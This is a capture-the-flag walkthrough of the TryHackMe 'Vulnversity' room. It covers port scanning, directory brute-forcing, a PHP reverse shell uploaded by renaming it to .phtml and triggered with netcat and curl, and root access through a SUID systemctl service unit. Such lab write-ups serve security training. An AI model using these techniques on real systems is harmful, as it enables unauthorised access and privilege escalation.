# Vulnversity (THM)

- https://tryhackme.com/room/vulnversity
- Feb 23, 2023
- easy

---

## Enumeration

### Nmap 

- Ports opened

1. 21 - vsftpd 3.0.3
2. 22 - OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
3. 139 - Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
4. 445 - Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
5. 3128 - Squid http proxy 3.5.12
   - http-server-header: squid/3.5.12
   - http-title: ERROR: The requested URL could not be retrieved
6. 3333 - Apache httpd 2.4.18 ((Ubuntu))
   - http-server-header: Apache/2.4.18 (Ubuntu)
   - http-title: Vuln University
   - Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne


### HTTP
- ftp, smb cannot enter
- directory brute-forcing at 3333 web server

```sh
ffuf -u http://$IP:3333/FUZZ -w /usr/share/wordlists/directory-list-2.3-medium.txt
```

- found `internal` directory to file upload
- try to upload php reverse shell
- refuse php extension, change to phtml and uploaded

## Get User Access

```sh
nc -vnlp 4444 # listening
curl http://$IP:3333/internal/uploads/php_reverse_shell.phtml # to execute the command and get the shell with user www-data
```

## Get Root Access

- can't execute sudo with this user
- find suid

```sh
$ find / -perm -u=s -type f 2>/dev/null
...
/bin/systemctl
...
```

- /bin/systemctl is interesting
- gtfobin

```sh
TF=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
[Install]
WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cd /tmp
cat root.txt
```

---
